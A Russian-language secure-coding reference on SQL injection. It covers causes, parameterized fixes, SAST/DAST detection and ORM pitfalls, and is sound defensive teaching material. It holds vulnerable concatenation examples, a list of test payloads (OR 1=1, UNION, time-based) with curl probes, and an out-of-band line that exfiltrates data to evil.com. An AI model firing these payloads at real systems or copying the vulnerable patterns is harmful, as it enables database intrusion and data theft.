# SQL Injection (SQLi)

## Определение

SQL Injection (SQLi) — уязвимость, при которой пользовательский ввод становится частью SQL-запроса и может изменить его логику.

- **CWE**: CWE-89 — Improper Neutralization of Special Elements used in an SQL Command
- **OWASP Top 10 (2021)**: A03: Injection
- **Риск**: Полный доступ к данным БД, удаление/изменение данных, RCE (в некоторых СУБД)

## Причина возникновения

Основная причина — **конкатенация пользовательского ввода со строкой SQL-запроса**.

Уязвимый пример (ОПАСНО):
```java
// Java / JDBC
String sql = "SELECT * FROM users WHERE login = '" + login + "'";
Statement stmt = connection.createStatement();
stmt.executeQuery(sql);
```

```python
# Python / psycopg2
query = f"SELECT * FROM users WHERE login = '{login}'"
cursor.execute(query)
```

```php
// PHP / mysqli
$sql = "SELECT * FROM users WHERE login = '" . $_GET['login'] . "'";
```

Пользовательский ввод становится частью SQL-кода.
Ввод: `' OR 1=1 --` → запрос: `SELECT * FROM users WHERE login = '' OR 1=1 --'`

Безопасная реализация:
```java
PreparedStatement ps = connection.prepareStatement(
    "SELECT * FROM users WHERE login = ?"
);
ps.setString(1, login);
```

```python
cursor.execute("SELECT * FROM users WHERE login = %s", (login,))
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE login = ?");
$stmt->execute([$login]);
```

### Почему PreparedStatement безопасен?

1. **SQL-запрос компилируется отдельно** — СУБД получает шаблон запроса ДО того, как увидит данные
2. **Пользовательские данные передаются отдельно** — как параметры, а не как часть SQL
3. **Данные интерпретируются как значения** — а не как SQL-код

> Важно: PreparedStatement **не просто экранирует символы**. Он разделяет SQL-код и пользовательские данные на уровне протокола СУБД.

## Виды SQL Injection

| Тип | Описание | Пример |
|-----|----------|--------|
| **In-band (Error-based)** | Результат возвращается в ответе приложения | Используются ошибки БД |
| **In-band (Union-based)** | Используется UNION для получения доп. данных | `UNION SELECT username, password FROM admins` |
| **Blind (Boolean-based)** | Информация по истинности/ложности условия | `' OR 1=1 --` vs `' OR 1=2 --` |
| **Blind (Time-based)** | Используются функции задержки | `'; WAITFOR DELAY '0:0:5' --` |
| **Out-of-band** | Данные передаются через DNS/HTTP | `LOAD_FILE(concat('\\\\', data, '.evil.com\\'))` |

## Как это обнаружить

### SAST (Static Analysis)

Большинство SAST-инструментов используют **Taint Analysis**:

```
Source (GET/POST/input)
  |
Конкатенация строки SQL
  |
Sink (executeQuery, exec, raw SQL)
```

Анализ строится вокруг трёх сущностей:

| Сущность | Описание | Пример |
|----------|----------|--------|
| **Source** | Источник пользовательского ввода | `request.getParameter("login")` |
| **Sink** | Опасная операция | `executeQuery(sql)` |
| **Sanitizer** | Безопасная обработка | `PreparedStatement`, ORM |

Если существует путь Source → Sink и отсутствует Sanitizer — инструмент сообщит о SQLi.

**Что проверять при анализе SAST findings:**
- [ ] Источник пользовательского ввода (Source)
- [ ] Опасную функцию (Sink)
- [ ] Наличие безопасной обработки (Sanitizer)
- [ ] Полный путь передачи данных (Taint Flow)
- [ ] Динамическую сборку SQL
- [ ] Использование `createNativeQuery()`
- [ ] Параметризацию пользовательских данных
- [ ] Динамическое формирование:
  - имени таблицы
  - имени столбца
  - ORDER BY
  - GROUP BY

### DAST (Dynamic Analysis)

DAST анализирует поведение приложения без доступа к исходному коду.

**Типичный процесс:**
1. Отправка SQL-пейлоадов
2. Анализ HTTP-ответов
3. Поиск сообщений об ошибках БД
4. Анализ различий в ответах (boolean-based)
5. Анализ времени выполнения (time-based)

**Примеры тестовых пейлоадов:**
```sql
-- Error detection
'
''
'-- -
';-- -

-- Boolean-based
' OR 1=1 --
' OR 1=2 --

-- Union-based
' UNION SELECT NULL --
' UNION SELECT NULL, NULL, NULL --

-- Time-based
'; WAITFOR DELAY '0:0:5' --
' OR SLEEP(5) --
```

### Code Review

```bash
# Что искать
grep -rn "executeQuery" src/
grep -rn "createStatement" src/
grep -rn "createNativeQuery" src/
grep -rn "rawQuery" src/
grep -rn ".exec(" src/     # Node.js
grep -rn "concat.*SELECT" src/
grep -rn "'.*+.*'" src/    # Конкатенация
```

## Способы предотвращения

### Обязательно:
1. **Параметризованные запросы (PreparedStatement)**
2. **ORM с корректной параметризацией**

### Дополнительно:
- Allowlist-валидация входных данных
- Принцип минимальных привилегий для учётной записи БД
- Не раскрывать пользователю сообщения об ошибках БД
- Регулярный SAST и DAST
- WAF как defense in depth

## ORM и SQL Injection

Использование ORM снижает вероятность SQL Injection, но **не гарантирует безопасность**.

### Потенциально опасные ситуации:
```python
# Hibernate — HQL конкатенация
String hql = "FROM User WHERE login='" + login + "'";  // ОПАСНО

# JPA — нативный запрос
entityManager.createNativeQuery(sql);  // ОПАСНО, если sql собран вручную

# Django — raw query
User.objects.raw("SELECT * FROM users WHERE login = '%s'" % login)  // ОПАСНО
```

Безопасно с ORM:
```python
# SQLAlchemy
User.query.filter_by(login=login).first()

# Django ORM
User.objects.filter(login=login).first()

# Hibernate
session.createQuery("FROM User WHERE login = :login")
    .setParameter("login", login)
    .list()
```

## Как проверить исправление

```bash
# 1. Отправить SQLi payload
curl "https://target.com/users?id=1' OR 1=1 --"

# 2. Проверить, что вернулся только один пользователь
# (если вернулись все — SQLi есть)

# 3. Проверить error-based
curl "https://target.com/users?id=1'"

# 4. Проверить time-based
curl "https://target.com/users?id=1' OR SLEEP(5) --"
time curl ...  # если >5s — есть SQLi
```

## Типичные ошибки

| Ошибка | Почему не работает |
|--------|-------------------|
| Экранирование через `addslashes()` | Обходится через UTF-8/Big5 encoding |
| Blacklist фильтрация (`' OR --`) | Обходится через `'||'` в Oracle, `'%00'` |
| Stored Procedures без параметров | Если внутри конкатенация — тоже уязвимо |
| WAF как единственная защита | Обходится через encoding, comment injection |
| ORM без raw queries | Но `rawQuery`, `nativeQuery` — опасны |

## Defense in Depth

```
Layer 1: PreparedStatement (основной механизм)
Layer 2: Allowlist-валидация
Layer 3: Минимальные привилегии БД
Layer 4: Разделение ролей пользователей
Layer 5: Централизованная обработка ошибок
Layer 6: WAF (ModSecurity, Cloudflare)
Layer 7: Регулярный SAST + DAST
Layer 8: Мониторинг и журналирование запросов
```

## Связанные стандарты

- **CWE-89**: SQL Injection
- **OWASP Top 10 (2021)**: A03: Injection
- **OWASP ASVS**: V.5 Validation, Sanitization and Encoding
- **PCI DSS**: 6.5.1 Injection (SQL injection)
- **NIST SSDF**: PW.9 — Secure Coding Practices

## Ключевые тезисы

- SQLi возникает из-за включения пользовательского ввода в SQL-запрос
- **Основной механизм защиты — параметризованные запросы (PreparedStatement)**
- Валидация входных данных — дополнительная мера, не заменяет параметризацию
- ORM снижает риск SQLi, но не исключает его (raw queries)
- SAST обнаруживает SQLi через Taint Analysis (Source → Sink → Sanitizer)
- DAST выявляет SQLi отправкой payload и анализом поведения приложения
- WAF — defense in depth, не серебряная пуля
- SQLi может дать полный доступ к данным БД (и RCE)

## Полезные ссылки

- [OWASP SQL Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
- [SQLMap](https://sqlmap.org/)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Практика

**Из опыта**: SQLi — уязвимость, которую я нахожу до сих пор, даже в 2025. Чаще всего в:
- Legacy коде (до внедрения ORM)
- Search endpoints с динамическим ORDER BY
- Экспорт в Excel/CSV с динамическими колонками
- GraphQL resolvers с ручной сборкой SQL

**Что спрашивать разработчиков на Code Review:**
- "Где здесь параметризация?"
- "Почему ты используешь `createNativeQuery`?"
- "Как этот ORDER BY защищён от SQLi?"
- "Какие данные могут прийти в этот raw query?"
- "Ты проверял, что будет, если ввести `' OR 1=1 --`?"

**Лучшая защита**: запретить `createNativeQuery` и любую конкатенацию в SQL на уровне Code Review + SAST правило в Semgrep. Если нужен динамический ORDER BY — использовать allowlist допустимых колонок.
